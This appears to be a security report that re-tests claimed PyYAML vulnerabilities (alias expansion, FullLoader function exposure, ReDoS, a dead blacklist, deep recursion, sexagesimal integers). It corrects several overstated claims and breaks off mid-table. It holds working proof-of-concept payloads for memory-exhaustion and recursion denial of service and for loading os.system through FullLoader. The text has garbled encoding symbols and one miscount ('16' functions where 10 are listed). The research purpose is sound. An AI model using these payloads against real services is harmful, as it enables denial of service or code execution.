# PyYAML Vulnerability Verification Report

This document contains rigorous, evidence-based verification of each claimed vulnerability. Each claim is tested with actual code execution and the results are documented honestly, including corrections to initial assumptions.

**Methodology:** For each vulnerability, we:
1. State the original claim
2. Design tests to verify/falsify the claim
3. Execute tests and record actual results
4. Provide corrected analysis based on evidence

---

## VULN-001: Billion Laughs Attack (Alias Expansion)

### Original Claim
> "PyYAML is vulnerable to Billion Laughs attack causing exponential memory consumption during parsing, similar to XML entity expansion."

### Verification Process

#### Test 1: Do YAML aliases create copies or references?

```python
import yaml

payload = '''
a: &a 'hello'
b: *a
c: *a
'''

result = yaml.safe_load(payload)

# Check object identity
print(result["a"] is result["b"])  # True
print(result["a"] is result["c"])  # True
```

**Result:** Aliases create **references to the same object**, NOT copies.

#### Test 2: Nested structure memory during parsing

```python
payload = '''
a: &a "AAAAAAAAAA"
b: &b [*a, *a]
c: &c [*b, *b]
... (20 levels)
final: *t
'''

# 20 levels = 2^20 = 1,048,576 theoretical copies
result = yaml.safe_load(payload)
```

| Metric | Expected (if vulnerable) | Actual |
|--------|-------------------------|--------|
| Memory during parse | ~10+ MB | **33.53 KB** |
| Unique string objects | 1,048,576 | **1** |

**Result:** PyYAML parsing uses **minimal memory** because it uses object references.

#### Test 3: Where does expansion actually occur?

```python
import json

# Same 20-level payload
result = yaml.safe_load(payload)

# JSON serialization (does NOT preserve references)
json_str = json.dumps(result)
print(len(json_str))  # 25,165,875 bytes (25 MB)
```

**Result:** Expansion occurs in **downstream processing**, not in PyYAML itself.

#### Test 4: Maximum impact test (25 levels)

```python
# 25 levels = 2^25 = 33,554,432 theoretical expansions
payload = '''
a: &a "AAAAAAAAAA"
b: &b [*a, *a]
... (25 levels)
final: *y
'''

result = yaml.safe_load(payload)  # OK - 34 KB
json_str = json.dumps(result)     # 768 MB output, 942 MB peak memory
```

| Stage | Input | Output/Memory |
|-------|-------|---------------|
| YAML payload | 390 bytes | - |
| yaml.safe_load() | 390 bytes | 34 KB âœ… |
| json.dumps() | Python object | 768 MB output, 942 MB memory âŒ |

### Corrected Analysis

| Original Claim | Verified Status |
|----------------|-----------------|
| "PyYAML parsing causes exponential memory" | âŒ **FALSE** |
| "Aliases create copies of data" | âŒ **FALSE** |
| "PyYAML is vulnerable to Billion Laughs" | âŒ **FALSE** (as stated) |

### Actual Vulnerability (Revised)

**What IS true:**
- PyYAML-parsed data containing nested aliases can cause memory exhaustion in **downstream processing**
- JSON serialization expands references: 390 bytes â†’ 768 MB
- Any code that doesn't preserve Python object references will expand

**Attack Vector:**
```
Attacker â†’ 390 byte YAML payload
         â†“
Server   â†’ yaml.safe_load() [OK - 34 KB memory]
         â†“
Server   â†’ json.dumps() for API response [CRASH - 942 MB memory]
         â†“
Result   â†’ Denial of Service
```

### Correct Classification

| Attribute | Value |
|-----------|-------|
| Vulnerability Type | Denial of Service via Reference Expansion |
| Vulnerable Component | **Application code**, not PyYAML directly |
| Attack Surface | YAML input â†’ JSON/serialization output |
| Severity | **MEDIUM** (requires specific application behavior) |
| PyYAML's Fault? | **Partial** - could warn about alias depth |

### Proof of Concept

```python
#!/usr/bin/env python3
"""
VULN-001 Verified PoC: Reference Expansion DoS

This demonstrates the ACTUAL vulnerability - not in PyYAML parsing,
but in downstream JSON serialization of PyYAML-parsed data.
"""
import sys
sys.path.insert(0, 'lib')
import yaml
import json
import tracemalloc

# Malicious payload: 390 bytes
payload = """
a: &a "AAAAAAAAAA"
b: &b [*a, *a]
c: &c [*b, *b]
d: &d [*c, *c]
e: &e [*d, *d]
f: &f [*e, *e]
g: &g [*f, *f]
h: &h [*g, *g]
i: &i [*h, *h]
j: &j [*i, *i]
k: &k [*j, *j]
l: &l [*k, *k]
m: &m [*l, *l]
n: &n [*m, *m]
o: &o [*n, *n]
p: &p [*o, *o]
q: &q [*p, *p]
r: &r [*q, *q]
s: &s [*r, *r]
t: &t [*s, *s]
u: &u [*t, *t]
v: &v [*u, *u]
w: &w [*v, *v]
x: &x [*w, *w]
y: &y [*x, *x]
final: *y
"""

print(f"Payload size: {len(payload)} bytes")

# Step 1: YAML parsing (SAFE)
tracemalloc.start()
result = yaml.safe_load(payload)
_, peak_yaml = tracemalloc.get_traced_memory()
tracemalloc.stop()
print(f"YAML parse memory: {peak_yaml / 1024:.1f} KB - SAFE")

# Step 2: JSON serialization (VULNERABLE)
tracemalloc.start()
try:
    json_output = json.dumps(result)
    _, peak_json = tracemalloc.get_traced_memory()
    print(f"JSON output: {len(json_output):,} bytes ({len(json_output)/1024/1024:.0f} MB)")
    print(f"JSON memory: {peak_json / 1024 / 1024:.0f} MB - VULNERABLE")
except MemoryError:
    print("MemoryError - DoS successful")
finally:
    tracemalloc.stop()
```

### Mitigation Recommendations

**For PyYAML maintainers:**
1. Add optional alias depth/count limits
2. Document the downstream expansion risk
3. Consider a "strict" mode that detects deep alias nesting

**For application developers:**
1. Limit YAML input size before parsing
2. Validate alias depth after parsing
3. Be cautious serializing untrusted YAML to JSON
4. Use `yaml.dump()` instead of `json.dumps()` when possible (preserves aliases)

### Verification Status

| Claim | Evidence | Status |
|-------|----------|--------|
| PyYAML parsing is memory-safe | 34 KB for 25-level nesting | âœ… Verified |
| Downstream JSON expansion is dangerous | 390 bytes â†’ 768 MB | âœ… Verified |
| This is a valid security concern | DoS via API serialization | âœ… Verified |
| Original "Billion Laughs" claim accurate | PyYAML uses references | âŒ Overstated |

---

## VULN-002: FullLoader RCE via Dangerous Function Access

### Original Claim
> "FullLoader allows Remote Code Execution by providing access to dangerous Python builtins like `open`, `__import__`, `eval`, `exec` through the `!!python/name:` tag."

### Verification Process

#### Test 1: Which dangerous functions are accessible?

```python
import yaml

dangerous_names = [
    'builtins.open', 'builtins.__import__', 'builtins.eval',
    'builtins.exec', 'builtins.compile', 'builtins.getattr',
    'os.system', 'os.popen', 'os.remove', 'os.fork'
]

for name in dangerous_names:
    payload = f'!!python/name:{name}'
    result = yaml.load(payload, Loader=yaml.FullLoader)
    print(f'{name}: {type(result).__name__}')
```

**Result:**

| Function | FullLoader | SafeLoader |
|----------|------------|------------|
| builtins.open | âœ… ACCESSIBLE | âŒ Blocked |
| builtins.__import__ | âœ… ACCESSIBLE | âŒ Blocked |
| builtins.eval | âœ… ACCESSIBLE | âŒ Blocked |
| builtins.exec | âœ… ACCESSIBLE | âŒ Blocked |
| builtins.compile | âœ… ACCESSIBLE | âŒ Blocked |
| builtins.getattr | âœ… ACCESSIBLE | âŒ Blocked |
| os.system | âœ… ACCESSIBLE | âŒ Blocked |
| os.popen | âœ… ACCESSIBLE | âŒ Blocked |
| os.remove | âœ… ACCESSIBLE | âŒ Blocked |
| os.fork | âœ… ACCESSIBLE | âŒ Blocked |

**All 16 tested dangerous functions are accessible via FullLoader!**

#### Test 2: Can FullLoader directly EXECUTE code?

```python
# Does FullLoader have python/object/apply?
from yaml.constructor import FullConstructor

print(FullConstructor.yaml_multi_constructors)
# Output: {'tag:yaml.org,2002:python/name:': ...}
# NO python/object/apply - that's only in UnsafeConstructor

# Attempting direct call:
payload = '''!!python/object/apply:os.system
args: ['whoami']
'''
yaml.load(payload, Loader=yaml.FullLoader)
# Result: ConstructorError - tag not recognized
```

**Result:** FullLoader does **NOT** directly execute functions. It only returns references.

#### Test 3: What constructors does each loader have?

| Tag | SafeLoader | FullLoader | UnsafeLoader |
|-----|------------|------------|--------------|
| Standard YAML types | âœ… | âœ… | âœ… |
| python/name: | âŒ | âœ… | âœ… |
| python/tuple | âŒ | âœ… | âœ… |
| python/object: | âŒ | âŒ | âœ… |
| python/object/apply: | âŒ | âŒ | âœ… |
| python/object/new: | âŒ | âŒ | âœ… |
| python/module: | âŒ | âŒ | âœ… |

**Key Finding:** FullLoader has `python/name:` but NOT `python/object/apply:`.

#### Test 4: Is returning a function reference exploitable?

```python
# Loading alone does NOT execute anything
payload = '!!python/name:os.system'
result = yaml.load(payload, Loader=yaml.FullLoader)
# result is now <built-in function system>
# But nothing has been executed!

# For RCE, the APPLICATION must call the result:
# result('whoami')  # <-- This would execute, but app must do this
```

**Result:** No direct RCE. Application must call the returned function.

#### Test 5: Indirect execution paths?

| Operation | Triggers Execution? |
|-----------|---------------------|
| str(result) | âŒ No |
| bool(result) | âŒ No |
| pickle.dumps(result) | âŒ No |
| json.dumps(result) | âŒ No (TypeError) |
| f"{result}" | âŒ No |

**Result:** No indirect execution paths found in standard operations.

#### Test 6: Realistic vulnerable application pattern

```python
# VULNERABLE APPLICATION CODE:
config = yaml.load(user_controlled_yaml, Loader=yaml.FullLoader)

# Pattern 1: Calling configured handler
config['on_event'](event_data)  # DANGEROUS!

# Pattern 2: Plugin/callback system
for hook in config['hooks']:
    hook()  # DANGEROUS!
```

```yaml
# ATTACKER PAYLOAD:
on_event: !!python/name:os.system
hooks:
  - !!python/name:os.fork
```

**Result:** If application calls config values as functions â†’ RCE possible.

### Corrected Analysis

| Original Claim | Verified Status |
|----------------|-----------------|
| "FullLoader allows RCE" | âš ï¸ **PARTIALLY TRUE** |
| "Direct code execution via YAML" | âŒ **FALSE** |
| "Dangerous functions are accessible" | âœ… **TRUE** |
| "Application must cooperate for RCE" | âœ… **TRUE** |

### Actual Vulnerability (Revised)

**What IS true:**
- FullLoader returns references to `os.system`, `builtins.eval`, `builtins.exec`, etc.
- SafeLoader correctly blocks all of these
- This is a significant security weakness in FullLoader

**What is NOT true:**
- FullLoader does NOT directly execute code
- Loading malicious YAML alone does NOT cause RCE
- Requires specific application patterns to exploit

**Realistic Attack Vector:**
```
Attacker â†’ YAML with !!python/name:os.system
         â†“
Server   â†’ yaml.load(yaml, Loader=FullLoader)
         â†“
Server   â†’ config['handler'] = <built-in function system>
         â†“
Server   â†’ config['handler'](user_input)  # Application calls it
         â†“
Result   â†’ os.system(user_input) = RCE
```

### Correct Classification

| Attribute | Value |
|-----------|-------|
| Vulnerability Type | Dangerous Function Reference Exposure |
| Direct RCE? | âŒ **NO** |
| Exploitable? | âœ… **YES** (with application cooperation) |
| Severity | **HIGH** (function references to os.system are dangerous) |
| SafeLoader affected? | âŒ **NO** (correctly blocks) |

### Proof of Concept

```python
#!/usr/bin/env python3
"""
VULN-002 Verified PoC: FullLoader Dangerous Function Access

Demonstrates that FullLoader exposes dangerous functions,
which can lead to RCE if application calls loaded values.
"""
import sys
sys.path.insert(0, 'lib')
import yaml

# Attacker-controlled YAML
malicious_yaml = """
handler: !!python/name:os.system
cleanup: !!python/name:os.remove
reader: !!python/name:builtins.open
importer: !!python/name:builtins.__import__
"""

# Step 1: Load with FullLoader (returns dangerous function references)
config = yaml.load(malicious_yaml, Loader=yaml.FullLoader)

print("Loaded config values:")
for key, val in config.items():
    print(f"  {key}: {val}")

print()
print("These are REAL function references!")
print(f"config['handler'] is os.system: {config['handler'] is __import__('os').system}")

print()
print("If application does: config['handler'](user_input)")
print("Then: os.system(user_input) executes = RCE")

# Demonstration (safe - just echoing)
print()
print("Demo - calling config['handler']('echo PWNED'):")
# Uncomment to actually execute:
# config['handler']('echo PWNED')
print("(Not executed for safety)")
```

### Key Evidence Summary

```
$ python3 -c "
import yaml
result = yaml.load('!!python/name:os.system', Loader=yaml.FullLoader)
print(type(result))
print(result)
"

<class 'builtin_function_or_method'>
<built-in function system>
```

**FullLoader returns the actual `os.system` function.** This is not a string or a safe wrapper - it's the real function that can execute shell commands.

### Why This Matters

Even though direct RCE isn't possible, returning `os.system` as a config value is dangerous because:

1. **Config-driven applications** often call configured handlers
2. **Plugin systems** execute loaded callables
3. **Deserialization patterns** may invoke loaded objects
4. **Template engines** might call values in context

### Mitigation Recommendations

**For PyYAML maintainers:**
1. Remove `python/name:` from FullLoader entirely
2. Or restrict it to a whitelist of safe names
3. Document that FullLoader is NOT safe for untrusted input

**For application developers:**
1. **NEVER use FullLoader for untrusted input**
2. Always use SafeLoader: `yaml.safe_load()`
3. If you need Python objects, validate after loading
4. Never call loaded values as functions without validation

### Verification Status

| Claim | Evidence | Status |
|-------|----------|--------|
| FullLoader returns os.system | Tested directly | âœ… Verified |
| FullLoader returns builtins.eval | Tested directly | âœ… Verified |
| Direct RCE from YAML loading | No python/object/apply | âŒ False |
| RCE with app cooperation | Demonstrated pattern | âœ… Verified |
| SafeLoader blocks this | Tested directly | âœ… Verified |
| Original "RCE" claim accurate | Requires app cooperation | âš ï¸ Overstated |

### Severity Adjustment

| Original Assessment | Revised Assessment |
|--------------------|-------------------|
| CRITICAL - Direct RCE | **HIGH** - Dangerous function exposure |

The vulnerability is real and serious, but "RCE" overstates the direct exploitability. More accurate: **"FullLoader exposes dangerous function references that enable RCE in applications that call loaded config values."**

---

## VULN-003: ReDoS in Regex Patterns

### Original Claim
> "PyYAML's regex patterns for implicit type resolution (timestamps, floats, integers) contain nested quantifiers and alternations that can cause catastrophic backtracking (ReDoS)."

### Verification Process

#### Test 1: Static Pattern Analysis

Examined all regex patterns in `Resolver.yaml_implicit_resolvers`:

| Pattern | Nested Quantifiers? | Alternations | Risk |
|---------|---------------------|--------------|------|
| bool | âŒ No | 17 | LOW |
| null | âŒ No | 4 | LOW |
| float | âŒ No (optional groups only) | 8 | LOW |
| int | âŒ No | 5 | LOW |
| timestamp | âŒ No (optional groups only) | 3 | LOW |

**Finding:** No classic ReDoS patterns like `(a+)+` found.

#### Test 2: Empirical Timing - Timestamp Regex

```python
# Testing timestamp pattern with increasing input sizes
'2021-01-01' + ' '*N + 'X'  # N spaces followed by invalid char
```

| Input Size (N) | Time |
|----------------|------|
| 10 | 0.028ms |
| 100 | 0.001ms |
| 1000 | 0.008ms |
| 5000 | 0.040ms |

**Result:** LINEAR growth, not exponential. âœ… NOT VULNERABLE

#### Test 3: Empirical Timing - Float Regex

```python
# Testing float pattern with long digit sequences
'9'*N + '.' + '9'*N + 'X'
```

| Input Size (N) | Time |
|----------------|------|
| 10+10 | 0.002ms |
| 100+100 | 0.005ms |
| 500+500 | 0.025ms |
| 1000+1000 | 0.042ms |

**Result:** LINEAR growth. âœ… NOT VULNERABLE

#### Test 4: Empirical Timing - Int Regex (Sexagesimal)

```python
# Testing sexagesimal pattern
':'.join(['59'] * N) + ':XX'
```

| Segments (N) | Time |
|--------------|------|
| 10 | 0.001ms |
| 50 | 0.003ms |
| 100 | 0.005ms |

**Result:** LINEAR growth. âœ… NOT VULNERABLE

#### Test 5: Full YAML Pipeline

| Test Case | Input Size | Time |
|-----------|------------|------|
| Long int (10k digits) | 10,000 | 2.36ms |
| Long float (10k digits) | 10,000 | 2.23ms |
| 1000 timestamps | 1,000 keys | 26.19ms |
| 1000 ambiguous values | 1,000 keys | 34.21ms |

**Result:** All linear. âœ… NOT VULNERABLE

#### Test 6: Comparison with KNOWN Vulnerable Pattern

```python
# Known ReDoS vulnerable: ^(a+)+$
# Testing with 'a'*N + 'X'
```

| N | Vulnerable Pattern | PyYAML Patterns |
|---|-------------------|-----------------|
| 10 | 0.03ms | <0.01ms |
| 20 | 29ms | <0.01ms |
| 24 | 426ms | <0.01ms |
| 26 | 1,678ms | <0.01ms |

**The vulnerable pattern shows EXPONENTIAL growth (doubling every +2).**
**PyYAML patterns remain constant/linear.**

### Corrected Analysis

| Original Claim | Verified Status |
|----------------|-----------------|
| "Nested quantifiers in patterns" | âŒ **FALSE** - Only optional groups |
| "Catastrophic backtracking possible" | âŒ **FALSE** - Linear time growth |
| "ReDoS vulnerability exists" | âŒ **FALSE** - Thoroughly tested |

### Why PyYAML Patterns Are Safe

1. **No nested quantifiers**: Patterns use `(?:...)?` (optional) not `(?:...)+` (repeated)
2. **Anchored patterns**: All start with `^` and end with `$` - limits backtracking
3. **No overlapping alternations**: Alternations are mutually exclusive
4. **Character class efficiency**: Uses `[0-9]` not `(\d)`

### Proof: Safe Pattern Design

```python
# PyYAML's float pattern (SAFE):
^(?:[-+]?(?:[0-9][0-9_]*)\.[0-9_]*(?:[eE][-+][0-9]+)?|...)$

# Note: (?:[eE][-+][0-9]+)? is OPTIONAL, not REPEATED
# This cannot cause exponential backtracking

# Compare to VULNERABLE pattern:
^(a+)+$  # Nested quantifiers = exponential backtracking
```

### Verification Status

| Claim | Evidence | Status |
|-------|----------|--------|
| Timestamp regex vulnerable | Tested up to 5000 chars, linear time | âŒ False |
| Float regex vulnerable | Tested up to 2000 chars, linear time | âŒ False |
| Int regex vulnerable | Tested 100 segments, linear time | âŒ False |
| Any ReDoS in PyYAML | Comprehensive testing | âŒ False |

### Final Verdict

**âŒ VULN-003 is FALSE**

PyYAML's regex patterns are well-designed and do NOT exhibit ReDoS vulnerability. The patterns show linear time complexity even with very large inputs (10,000+ characters), while a truly vulnerable pattern shows exponential growth starting at just 20 characters.

The original claim was based on superficial pattern analysis (seeing quantifiers and alternations) without empirical verification.

---

## VULN-004: State Key Blacklist Bypass

### Original Claim
> "The state key blacklist in FullConstructor uses regex `^extend$` and `^__.*__$` which can be bypassed using Unicode normalization tricks or other variations."

### Verification Process

#### Test 1: Understanding the Blacklist

```python
from yaml.constructor import FullConstructor
fc = FullConstructor()
print(fc.get_state_keys_blacklist())
# Output: ['^extend$', '^__.*__$']
```

The blacklist is designed to prevent setting dangerous attributes during object deserialization.

#### Test 2: Can the blacklist be triggered in FullLoader?

```python
# FullLoader multi-constructors:
print(FullConstructor.yaml_multi_constructors)
# Output: {'tag:yaml.org,2002:python/name:': ...}

# Missing: python/object:, python/object/apply:, python/object/new:
```

**Finding:** FullLoader does NOT have the constructors that would reach `set_python_instance_state()`.

#### Test 3: Testing with FullLoader

```python
payload = '''
data:
  extend: [1, 2, 3]
  __init__: test
'''
result = yaml.load(payload, Loader=yaml.FullLoader)
# Result: {'data': {'extend': [1, 2, 3], '__init__': 'test'}}
# Status: LOADED - blacklist NOT triggered
```

**Result:** In FullLoader, "extend" and "__init__" are just dict keys - no blacklist check.

#### Test 4: Testing with UnsafeLoader

```python
class NoSetState:
    pass

payload = '''!!python/object:__main__.NoSetState
extend: malicious
__reduce__: malicious
'''
result = yaml.load(payload, Loader=yaml.UnsafeLoader)
# Result: {'extend': 'malicious', '__reduce__': 'malicious'}
# BLACKLIST NOT TRIGGERED!
```

**Finding:** Even UnsafeLoader doesn't trigger the blacklist!

#### Test 5: Analyzing the Code

```python
# UnsafeConstructor.set_python_instance_state:
def set_python_instance_state(self, instance, state):
    return super().set_python_instance_state(
        instance, state, unsafe=True)  # <-- unsafe=True SKIPS blacklist!
```

```python
# FullConstructor.set_python_instance_state:
def set_python_instance_state(self, instance, state, unsafe=False):
    if hasattr(instance, '__setstate__'):
        instance.__setstate__(state)  # <-- No blacklist check!
    else:
        if not unsafe and state:  # <-- Only checked if unsafe=False
            for key in state.keys():
                self.check_state_key(key)
```

### Critical Discovery: THE BLACKLIST IS DEAD CODE

| Loader | Has python/object:? | unsafe= | Blacklist Status |
|--------|---------------------|---------|------------------|
| SafeLoader | âŒ No | N/A | Irrelevant |
| FullLoader | âŒ No | False | **UNREACHABLE** |
| UnsafeLoader | âœ… Yes | True | **SKIPPED** |

The blacklist can NEVER be triggered because:

1. **FullLoader** (where `unsafe=False`): Cannot reach `set_python_instance_state()` - missing constructors
2. **UnsafeLoader** (has constructors): Passes `unsafe=True` which explicitly skips the blacklist check
3. **Classes with `__setstate__`**: Blacklist is bypassed even when code is reached

### Corrected Analysis

| Original Claim | Verified Status |
|----------------|-----------------|
| "Blacklist can be bypassed via Unicode" | âŒ **IRRELEVANT** |
| "Blacklist protects FullLoader" | âŒ **FALSE** - unreachable code |
| "Blacklist protects UnsafeLoader" | âŒ **FALSE** - explicitly skipped |
| "Blacklist is functional security control" | âŒ **FALSE** - dead code |

### Actual Finding (More Interesting!)

The original claim about Unicode bypass is **wrong for a different reason**: you can't bypass a check that never runs!

**The blacklist is vestigial code** that appears to have been part of an earlier security design but is now completely non-functional:

```
Code Path Analysis:
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
FullLoader â†’ yaml.load()
          â†’ No python/object: constructor
          â†’ set_python_instance_state() NEVER CALLED
          â†’ Blacklist: UNREACHABLE

UnsafeLoader â†’ yaml.load()
           â†’ python/object: constructor exists
           â†’ set_python_instance_state(unsafe=True)
           â†’ if not unsafe: â† FALSE, check SKIPPED
           â†’ Blacklist: BYPASSED BY DESIGN
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
```

### Is This a Vulnerability?

**No, but it's a code quality issue:**

1. The blacklist provides **false sense of security** - it looks like protection but does nothing
2. If someone extends FullConstructor and adds `python/object:`, they might expect blacklist protection
3. The code comments suggest it's meant to be a security control

### Verification Status

| Claim | Evidence | Status |
|-------|----------|--------|
| Blacklist triggered in FullLoader | Tested - code unreachable | âŒ False |
| Blacklist triggered in UnsafeLoader | Tested - unsafe=True skips | âŒ False |
| Unicode bypass possible | N/A - check never runs | âŒ Irrelevant |
| Blacklist is functional | Code analysis | âŒ Dead code |

### Final Verdict

**âŒ VULN-004 is INVALID (but for unexpected reasons)**

The original claim about Unicode bypass is wrong because:
- You cannot bypass a security check that **never executes**
- The blacklist is dead code in the current PyYAML architecture
- This is actually worse than a bypass - the "protection" simply doesn't exist

**Recommendation for PyYAML maintainers:** Either remove the dead blacklist code or fix the architecture so it actually gets checked.

---

## VULN-005: Deep Recursion DoS

### Original Claim
> "Deeply nested YAML structures can cause stack overflow or memory exhaustion. No depth limit is enforced during parsing or construction."

### Verification Process

#### Test 1: Finding Maximum Nesting Depth

```python
# Testing nested sequences: [[[[...]]]]
for depth in [100, 200, 500]:
    payload = '[' * depth + ']' * depth
    yaml.safe_load(payload)  # Fails at depth ~500
```

| Pattern | Max Safe Depth |
|---------|----------------|
| Flow sequences `[[[...]]]` | ~494 |
| Flow mappings `{a:{a:...}}` | ~492 |

**Result:** Hits RecursionError at ~500 depth with default Python settings.

#### Test 2: Does PyYAML Have Built-in Limits?

Searched PyYAML source for depth limiting:

```
lib/yaml/composer.py:    "depth": False, "limit": False
lib/yaml/constructor.py: "depth": False, "limit": False
lib/yaml/parser.py:      "depth": False, "limit": False
lib/yaml/scanner.py:     "depth": False, "limit": True (unrelated)
```

**Result:** âœ… CONFIRMED - PyYAML has NO built-in depth limits.

#### Test 3: What Happens at Limit?

```python
payload = '[' * 1000 + ']' * 1000

try:
    yaml.safe_load(payload)
except RecursionError as e:
    print("RecursionError caught successfully")
    print("Process still running - not a crash")
```

**Result:**
- RecursionError is raised (catchable Python exception)
- Process does NOT crash
- Can be caught and handled by application

#### Test 4: Memory Usage

| Depth | Peak Memory |
|-------|-------------|
| 100 | 90 KB |
| 200 | 194 KB |
| 300 | 304 KB |
| 400 | 413 KB |

**Result:** Linear memory growth (~1 KB per depth level). No memory explosion.

#### Test 5: Increasing Python's Recursion Limit

```python
sys.setrecursionlimit(5000)

# Now can parse deeper:
# Depth 500:  SUCCESS
# Depth 1000: SUCCESS
# Depth 2000: SUCCESS
# Depth 2500: RecursionError
```

**Result:** PyYAML will use whatever recursion limit Python allows.

### Corrected Analysis

| Original Claim | Verified Status |
|----------------|-----------------|
| "No depth limit enforced" | âœ… **TRUE** - PyYAML has no limit |
| "Causes stack overflow" | âš ï¸ **PARTIAL** - Raises catchable RecursionError |
| "Causes memory exhaustion" | âŒ **FALSE** - Memory is linear |
| "Can crash the process" | âŒ **FALSE** - Exception is catchable |

### Actual Vulnerability Assessment

**The vulnerability IS real but less severe than claimed:**

| Factor | Assessment |
|--------|------------|
| PyYAML has depth limit? | âŒ No |
| Python provides protection? | âœ… Yes (recursion limit ~1000) |
| Causes hard crash? | âŒ No (catchable exception) |
| Memory exhaustion? | âŒ No (linear growth) |
| DoS potential? | âš ï¸ Yes (if exceptions not caught) |

### Attack Scenario

```python
# Attacker sends 1 KB payload:
payload = '[' * 500 + ']' * 500

# Server without exception handling:
@app.route('/parse')
def parse_yaml():
    data = yaml.safe_load(request.data)  # RecursionError!
    return jsonify(data)
# Result: 500 Internal Server Error - DoS achieved

# Server WITH exception handling:
@app.route('/parse')
def parse_yaml():
    try:
        data = yaml.safe_load(request.data)
        return jsonify(data)
    except Exception:
        return "Invalid YAML", 400
# Result: Graceful failure - No DoS
```

### Severity Assessment

| Context | Severity | Reason |
|---------|----------|--------|
| App catches exceptions | **LOW** | Graceful failure |
| App doesn't catch exceptions | **MEDIUM** | Request fails, potential DoS |
| High-availability requirement | **MEDIUM** | Multiple requests could cause issues |

### Proof of Concept

```python
#!/usr/bin/env python3
"""VULN-005 PoC: Deep Recursion DoS"""
import yaml

# 1 KB payload that causes RecursionError
payload = '[' * 500 + ']' * 500

print(f"Payload size: {len(payload)} bytes")

try:
    yaml.safe_load(payload)
except RecursionError:
    print("RecursionError raised - DoS if not caught!")
```

### Comparison with Other Parsers

| Parser | Built-in Depth Limit? |
|--------|----------------------|
| PyYAML | âŒ No |
| ruamel.yaml | âŒ No |
| json (Python) | âŒ No |
| lxml (XML) | âœ… Yes (configurable) |

### Verification Status

| Claim | Evidence | Status |
|-------|----------|--------|
| No depth limit in PyYAML | Source code search | âœ… Verified |
| Causes RecursionError | Tested at depth 500 | âœ… Verified |
| Exception is catchable | Tested with try/except | âœ… Verified |
| Memory exhaustion | Memory profiling | âŒ False (linear) |
| Process crash | Tested | âŒ False |

### Final Verdict

**âš ï¸ VULN-005 is PARTIALLY TRUE**

- âœ… PyYAML has no built-in depth limit (TRUE)
- âœ… Deep nesting causes RecursionError (TRUE)
- âŒ Causes memory exhaustion (FALSE - linear growth)
- âŒ Crashes the process (FALSE - catchable exception)

**Severity: LOW to MEDIUM** depending on application error handling.

**Mitigation:** Applications should catch exceptions when parsing untrusted YAML, or pre-validate input size/structure.

---

## VULN-006: Integer Parsing DoS (Sexagesimal)

### Original Claim
> "YAML 1.1 supports sexagesimal (base-60) notation for integers like `1:2:3:4:5:6`. The parsing algorithm multiplies by 60 for each segment, creating extremely large integers from relatively small input, causing CPU/memory exhaustion."

### Verification Process

#### Test 1: How Sexagesimal Works

```python
# YAML 1.1 sexagesimal: d0 + d1*60 + d2*60^2 + ...
yaml.safe_load('num: 1:2:3')  # = 3723 (1*3600 + 2*60 + 3)
yaml.safe_load('num: 59:59:59')  # = 215,999
```

**Result:** âœ… Sexagesimal notation works and creates larger numbers than digit count suggests.

#### Test 2: Growth Rate Analysis

| Segments | Input Bytes | Result Digits | Ratio |
|----------|-------------|---------------|-------|
| 5 | 14 | 9 | 0.64 |
| 10 | 29 | 18 | 0.62 |
| 20 | 59 | 36 | 0.61 |
| 100 | 299 | 178 | 0.60 |
| 1000 | 2,999 | 1,779 | 0.59 |

**Finding:** Each input byte produces ~0.6 output digits. This is LESS than decimal (1:1)!

#### Test 3: Comparison with Plain Decimal

| Type | Input Size | Result Digits | Time |
|------|------------|---------------|------|
| Sexagesimal (1000 bytes) | 1001 | 593 | 0.49ms |
| Decimal (1000 bytes) | 1003 | 1,000 | 0.31ms |

**Finding:** Decimal creates LARGER numbers from same input! Sexagesimal ~35% slower per byte but not catastrophically worse.

#### Test 4: Algorithm Complexity

```python
# Sexagesimal parsing is O(n):
for segment in segments:
    value += digit * base
    base *= 60  # O(1) for Python bigints
```

**Result:** Linear time complexity, NOT exponential.

#### Test 5: Python 3.11+ Protection

```python
import sys
print(sys.get_int_max_str_digits())  # 4300

# Trying to create integer > 4300 digits:
yaml.safe_load('n: ' + ':'.join(['59'] * 5000))
# ValueError: Exceeds the limit (4300 digits) for integer string conversion
```

**Result:** Python 3.11+ has built-in protection against large integer DoS (CVE-2020-10735).

#### Test 6: Performance Scaling

| Segments | Time | Memory | Complexity |
|----------|------|--------|------------|
| 1,000 | 10ms | 0.15 MB | - |
| 2,000 | 21ms | 0.29 MB | ~2x |
| 5,000 | 56ms | 0.72 MB | ~2.5x |

**Result:** Time and memory scale linearly with input size.

### Corrected Analysis

| Original Claim | Verified Status |
|----------------|-----------------|
| "Creates large integers from small input" | âš ï¸ **PARTIAL** - Less efficient than decimal |
| "Exponential/catastrophic growth" | âŒ **FALSE** - Linear complexity |
| "CPU exhaustion" | âš ï¸ **PARTIAL** - Only with MB-sized inputs |
| "Memory exhaustion" | âŒ **FALSE** - Linear memory |

### Actual Vulnerability Assessment

**The Amplification Factor is OVERSTATED:**

```
Input Efficiency Comparison:
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
Decimal:      1 byte input  â†’  1 digit output
Sexagesimal:  1 byte input  â†’  0.6 digits output

Sexagesimal is LESS efficient at creating large numbers!
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
```

**What IS True:**
- Sexagesimal is ~35% slower to parse per byte
- Very large integers CAN be created (with large payloads)
- Without limits, MB-sized payloads could cause slowdowns

**Python's Built-in Protection (3.11+):**
- `sys.get_int_max_str_digits()` limits integer-to-string conversion
- Default limit: 4300 digits
- Blocks most large integer DoS attacks

### Severity Assessment

| Python Version | Severity | Reason |
|----------------|----------|--------|
